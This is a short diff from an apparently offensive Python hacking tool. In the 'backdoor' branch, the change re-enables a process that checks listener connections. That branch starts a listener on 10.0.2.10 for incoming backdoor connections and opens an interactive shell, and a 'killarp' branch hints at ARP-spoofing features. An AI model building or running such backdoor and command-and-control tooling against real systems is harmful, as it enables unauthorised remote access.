@@ -434,11 +434,11 @@ while True:
     elif command == 'backdoor':
         my_listener = Listener("10.0.2.10", 6217)  # listener for incoming connections
         service = multiprocessing.Process(target=my_listener.server)
-        # status = multiprocessing.Process(target=my_listener.check_connections)
+        connections_status = multiprocessing.Process(target=my_listener.check_connections)
         service.start()
-        # status.start()
+        connections_status.start()
         my_listener.shell()
-        # status.terminate()
+        connections_status.terminate()
         service.terminate()
 
     elif command == 'killarp':
